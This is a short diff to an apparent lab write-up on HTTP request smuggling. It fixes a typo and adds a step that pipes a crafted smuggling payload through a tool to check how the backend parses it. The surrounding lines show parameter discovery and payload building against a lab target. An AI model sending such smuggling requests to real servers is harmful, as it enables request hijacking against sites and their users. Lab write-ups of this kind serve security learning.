@@ -70,7 +70,7 @@ arjun -u https://$LAB_URL
 [+] Heuristic scanner found 1 parameter: search
 ```
 
-Confirm with it curl request:
+Confirm it with curl request:
 ```shell
 curl -X POST https://$LAB_URL -s --data "search=toto" | grep "toto" -C 10 --color
 [...]                    <section class=blog-header>
@@ -129,6 +129,11 @@ printf "0\r\n\r\n$(cat search_modify)" > payload
 ```shell
 curl -s -X POST http://localhost:8888/ --data-binary "@payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride --chunked > smuggle
 
+```
+Before sending request, check how it wil be interpreted by backend:
+```shell
+cat smuggle | httpcustomhouse -cl | httpcustomhouse -te -r  # check if the request is smuggled
+cat smuggle | httpcustomhouse -cl | httpcustomhouse -te -r 2>&1 >/dev/null | httpcustomhouse -cl # smuggle request treatment
 ```
 
 Send the request:
